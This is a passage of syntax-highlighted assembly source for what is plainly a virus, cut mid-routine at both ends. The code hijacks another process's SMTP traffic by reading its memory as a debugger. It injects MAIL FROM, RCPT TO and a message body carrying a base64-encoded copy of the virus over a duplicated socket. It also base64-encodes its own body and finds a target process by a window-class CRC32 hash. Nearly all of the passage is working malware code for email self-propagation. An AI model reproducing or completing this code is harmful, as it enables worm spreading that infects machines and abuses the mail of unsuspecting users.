                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SizeOf__MAIL_FROM</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e__MAIL_FROM</span><span class="sc4">+</span><span class="sc2">00000005h</span><span class="sc0">      </span><span class="sc1">;Buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hDupSocket</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Socket</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Send TO:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;Flags</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SizeOf__RCPT_TO</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;Size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e__RCPT_TO</span><span class="sc4">+</span><span class="sc2">00000005h</span><span class="sc0">        </span><span class="sc1">;Buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hDupSocket</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Socket</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Send message body</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;Flags</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SizeOf__BODY</span><span class="sc0">               </span><span class="sc1">;Size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e__BODY</span><span class="sc0">             </span><span class="sc1">;Buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hDupSocket</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Socket</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Send BASE64 encoded virus</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                  </span><span class="sc1">;Flags</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SIZEOF_VIRUS_BASE64</span><span class="sc0">            </span><span class="sc1">;Size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BASE64__encoded</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hDupSocket</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;Socket</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_send</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">CloseDupHandle</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hDupSocket</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CloseHandle</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TargetStatus</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
                
</span><span class="sc5">ExitWorkWith__DOT</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_Manipulate__send</span><span class="sc0">       

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;RecvSmtpReply</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">RecvSmtpReply</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Buffer_rcv</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FIONREAD_param</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4004667Fh</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hDupSocket</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_ioctlsocket</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FIONREAD_param</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">RecvSmtpReply</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">              </span><span class="sc1">;Flags</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FIONREAD_param</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer_rcv</span><span class="sc0">          </span><span class="sc1">;Buffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hDupSocket</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;Socket</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_recv</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">NoMoreData2Read</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Buffer_rcv</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' 453'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">RecvOk</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' 052'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">RecvOk</span><span class="sc0">
</span><span class="sc5">RecvError</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">RecvOk</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Read parameters used by the caller and use them to capture its data buffer</span><span class="sc0">
</span><span class="sc1">;This data buffer may contain SMTP commands as well as the mail message</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  edi -&gt; Context for process being debugged</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   ecx -&gt; Size of buffer or 00000000h on error</span><span class="sc0">
</span><span class="sc1">;       esi -&gt; Ptr to a copy of callers buffer (ManipulateBuffer)</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">GetSendCallerBuffer</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;Get calling parameters</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">CONTEXT.CONTEXT_Esp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZEOF_SEND_PARAMS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer_send_Params</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirusReadProcessMemory</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorGetCallerBuffer</span><span class="sc0">

                </span><span class="sc1">;Buffer is too big or invalid?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0000000Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">ErrorGetCallerBuffer</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZEOF_MANIPULATE_BUFFER</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">ErrorGetCallerBuffer</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">00000008h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ManipulateBuffer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirusReadProcessMemory</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorGetCallerBuffer</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ErrorGetCallerBuffer</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;BASE64encode</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:  esi &lt;- Buffer with data to encode</span><span class="sc0">
</span><span class="sc1">;       edi &lt;- Destination buffer</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">


</span><span class="sc5">BASE64encode</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BASE64__lines</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">BASE64encode_loop</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZEOF_VIRUS</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">BASE64__exit</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZEOF_VIRUS</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">BASE64__00</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">BASE64__00</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZEOF_VIRUS</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">BASE64__01</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">BASE64__01</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00fc0000h</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Base64DecodeTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0003f000h</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Base64DecodeTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000fc0h</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Base64DecodeTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000003fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Base64DecodeTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZEOF_VIRUS</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">BASE64__02</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">00000001h</span><span class="sc4">],</span><span class="sc12">'='</span><span class="sc0">

</span><span class="sc5">BASE64__02</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZEOF_VIRUS</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">BASE64__03</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">00000002h</span><span class="sc4">],</span><span class="sc12">'='</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BASE64__lines</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BASE64__lines</span><span class="sc4">],</span><span class="sc2">00000013h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">BASE64encode_loop</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A0Dh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BASE64__lines</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">BASE64__03</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">BASE64encode_loop</span><span class="sc0">

</span><span class="sc5">BASE64__exit</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A0Dh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Prepare thread context structure</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On entry:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;On exit:   edi -&gt; Ptr to thread context structure</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">PrepareContext</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ThreadContext</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SizeOfContext</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">CONTEXT.CONTEXT_ContextFlags</span><span class="sc4">],</span><span class="sc5">CONTEXT_CONTROL</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Window enumeration procedure</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">EnumWndProc</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ClassName</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetClassNameA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">WindowNotFound</span><span class="sc0">
                                
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetStringCRC32</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0cfa7a89h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">WindowNotFound</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TargetProcessID</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_GetWindowThreadProcessId</span><span class="sc4">]</span><span class="sc0">
                
